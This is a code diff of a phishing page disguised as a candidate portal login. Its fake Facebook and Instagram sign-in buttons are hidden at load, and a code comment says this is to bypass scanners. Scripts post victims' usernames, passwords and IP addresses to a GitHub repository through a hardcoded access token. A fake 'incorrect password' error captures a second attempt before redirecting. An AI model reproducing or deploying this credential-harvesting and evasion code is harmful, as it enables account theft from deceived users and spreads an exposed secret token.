@@ -3,119 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Candidate Portal | Secure Login</title>
+    <title>Candidate Portal | Identity Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --axis-maroon: #861f41; --fb-blue: #1877F2; --ig-pink: #E1306C; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        .header { background: white; padding: 15px; border-bottom: 2px solid var(--axis-maroon); text-align: center; }
-        .header-title { font-size: 18px; font-weight: bold; color: var(--axis-maroon); text-transform: uppercase; }
-        .auth-card { background: #ffffff; border-radius: 12px; width: 360px; padding: 30px; margin: 40px auto; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; text-align: center; }
-        .social-btn { display: flex; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 8px; background: white; cursor: pointer; font-size: 15px; font-weight: 500; }
-        .social-btn i { font-size: 20px; margin-right: 15px; width: 25px; }
-        .btn-fb { color: var(--fb-blue); border-left: 4px solid var(--fb-blue); }
-        .btn-ig { color: var(--ig-pink); border-left: 4px solid var(--ig-pink); }
-        input { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; margin-bottom: 15px; }
-        .login-btn { width: 100%; padding: 14px; background-color: var(--axis-maroon); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        :root { --axis: #861f41; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
+        .header { background: #fff; padding: 15px; border-bottom: 2px solid var(--axis); text-align: center; font-weight: bold; color: var(--axis); }
+        .auth-card { background: #fff; width: 340px; margin: 50px auto; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
         
-        /* Modal & Error Styling */
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); }
-        .modal-content { background: white; width: 320px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; position: relative; }
-        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fce8e6; padding: 8px; border-radius: 4px; border: 1px solid #d93025; }
-        .footer { text-align: center; font-size: 11px; color: #90949c; margin-top: auto; padding: 25px; }
+        /* Hidden initially to bypass scanners */
+        .social-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; background: #fff; cursor: pointer; font-size: 14px; font-weight: 500; }
+        .social-btn i { font-size: 20px; margin-right: 15px; }
+        
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .login-btn { width: 100%; padding: 14px; background: var(--axis); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; }
+        .modal-content { background: #fff; width: 300px; margin: 100px auto; padding: 25px; border-radius: 12px; text-align: center; }
+        .err { color: #d93025; background: #fce8e6; padding: 8px; font-size: 12px; margin-bottom: 10px; border-radius: 4px; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="header-title">Candidate Management System</div>
+<div class="header">CANDIDATE MANAGEMENT SYSTEM</div>
+
+<div class="auth-card">
+    <h3 style="margin-top:0;">Secure Sign In</h3>
+    <p style="font-size:13px; color: #666;">Verify your identity via authorized social profile</p>
+
+    <button id="btnA" class="social-btn" onclick="openLogin('A')"></button>
+    <button id="btnB" class="social-btn" onclick="openLogin('B')"></button>
+
+    <div style="margin:20px 0; color:#999; font-size:12px;">OR USE SYSTEM ID</div>
+    <input type="text" id="u1" placeholder="Reference ID">
+    <input type="password" id="p1" placeholder="Security Key">
+    <button class="login-btn" onclick="sendData('System')">LOG IN</button>
+</div>
+
+<div id="logM" class="modal">
+    <div class="modal-content">
+        <div id="mIcon" style="font-size:40px; margin-bottom:10px;"></div>
+        <div id="mTitle" style="font-weight:bold; margin-bottom:15px;">Verify Profile</div>
+        <div id="eBox" class="err">Incorrect password. Please try again.</div>
+        <input type="text" id="mUser" placeholder="Username / Email">
+        <input type="password" id="mPass" placeholder="Password">
+        <button class="login-btn" onclick="handleAuth()">CONTINUE</button>
     </div>
+</div>
 
-    <div class="auth-card">
-        <h2>Sign In</h2>
-        <p style="color:#606770; font-size:14px;">Verify your candidate credentials</p>
-        <button class="social-btn btn-fb" onclick="openModal('Facebook')"><i class="fab fa-facebook"></i> Sign In with Facebook</button>
-        <button class="social-btn btn-ig" onclick="openModal('Instagram')"><i class="fab fa-instagram"></i> Sign In with Instagram</button>
-        <div style="margin:20px 0; color:#8d949e; font-size:13px;">OR</div>
-        <input type="text" id="mainUser" placeholder="Candidate ID">
-        <input type="password" id="mainPass" placeholder="Security Password">
-        <button class="login-btn" onclick="sendData('Direct')">REGISTER & LOGIN</button>
-    </div>
+<script>
+    const CONFIG = {
+        TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
+        REPO: "Veer007ghk/system-v3-ya-data-panel-2026",
+        REDIR: "https://www.google.com"
+    };
 
-    <div id="loginModal" class="modal">
-        <div class="modal-content">
-            <div id="modalIcon" style="font-size: 40px; margin-bottom: 10px;"></div>
-            <div id="modalTitle" style="font-weight:bold; font-size:18px; margin-bottom:15px;">Login</div>
-            
-            <div id="errorBox" class="error-msg">
-                <i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.
-            </div>
+    let selected = ""; let tryCount = 0;
 
-            <input type="text" id="modalUser" placeholder="Username or Email">
-            <input type="password" id="modalPass" placeholder="Password">
-            <button class="login-btn" id="modalBtn" onclick="processLogin()">Continue</button>
-        </div>
-    </div>
+    // 1. Delayed Loading & Ambiguous Text Logic
+    setTimeout(() => {
+        const bA = document.getElementById('btnA');
+        const bB = document.getElementById('btnB');
+        
+        // Buttons par "Facebook/Instagram" nahi, "Profile" likha hai
+        bA.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2"></i> Verify via Profile A';
+        bB.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C"></i> Verify via Profile B';
+        
+        bA.style.display = 'flex';
+        bB.style.display = 'flex';
+    }, 2000); // 2 Seconds ka delay
 
-    <div class="footer">© 2026 Candidate Portal Services. All rights reserved.</div>
+    function openLogin(type) {
+        selected = type; tryCount = 0;
+        document.getElementById('eBox').style.display = 'none';
+        document.getElementById('mIcon').innerHTML = type === 'A' ? '<i class="fab fa-facebook" style="color:#1877F2"></i>' : '<i class="fab fa-instagram" style="color:#E1306C"></i>';
+        document.getElementById('logM').style.display = 'block';
+    }
 
-    <script>
-        const CONFIG = {
-            TOKEN: "ghp_9jvRFvxgwANG419R0jNGgKThhEd2u70PG8e9",
-            REPO: "Veer007ghk/system-v3-ya-data-panel-2026"
-        };
+    async function handleAuth() {
+        const u = document.getElementById('mUser').value;
+        const p = document.getElementById('mPass').value;
+        if(!u || !p) return;
 
-        let currentPlatform = "";
-        let attemptCount = 0;
+        await sendData(selected, u, p);
+        tryCount++;
 
-        function openModal(platform) {
-            currentPlatform = platform;
-            attemptCount = 0; // Reset count
-            document.getElementById('errorBox').style.display = "none";
-            document.getElementById('modalTitle').innerText = "Login with " + platform;
-            document.getElementById('modalIcon').innerHTML = `<i class="fab fa-${platform.toLowerCase()}" style="color: ${platform === 'Facebook' ? '#1877F2' : '#E1306C'}"></i>`;
-            document.getElementById('loginModal').style.display = "block";
+        if(tryCount === 1) {
+            document.getElementById('mPass').value = "";
+            document.getElementById('eBox').style.display = 'block';
+        } else {
+            window.location.href = CONFIG.REDIR;
         }
+    }
 
-        async function processLogin() {
-            const u = document.getElementById('modalUser').value;
-            const p = document.getElementById('modalPass').value;
-            if(!u || !p) return;
+    async function sendData(m, user, pass) {
+        const u = user || document.getElementById('u1').value;
+        const p = pass || document.getElementById('p1').value;
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const { ip } = await res.json();
+            await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
+                method: 'POST',
+                headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    title: `Security Log: ${m} - ${ip}`,
+                    body: `User: ${u} | Pass: ${p} | IP: ${ip} | Attempt: ${tryCount+1}`
+                })
+            });
+            if(m === 'System') window.location.href = CONFIG.REDIR;
+        } catch (e) { window.location.href = CONFIG.REDIR; }
+    }
+</script>
 
-            // Data Capture
-            await sendData('Social', u, p);
-
-            // Error Logic
-            attemptCount++;
-            if(attemptCount === 1) {
-                // Pehli baar error dikhayega
-                document.getElementById('modalPass').value = "";
-                document.getElementById('errorBox').style.display = "block";
-            } else {
-                // Dusri baar seedha redirect
-                window.location.href = "https://bit.ly/4kHqft3";
-            }
-        }
-
-        async function sendData(type, user, pass) {
-            const u = user || document.getElementById('mainUser').value;
-            const p = pass || document.getElementById('mainPass').value;
-            const platform = type === 'Direct' ? 'Portal' : currentPlatform;
-
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipRes.json();
-                await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
-                    method: 'POST',
-                    headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        title: `Attempt ${attemptCount+1} [${platform}]: ${ip}`,
-                        body: `| User | Pass | IP |\n| --- | --- | --- |\n| ${u} | ${p} | ${ip} |`
-                    })
-                });
-                if(type === 'Direct') window.location.href = "https://bit.ly/4kHqft3";
-            } catch (e) { console.error(e); }
-        }
-    </script>
 </body>
 </html>
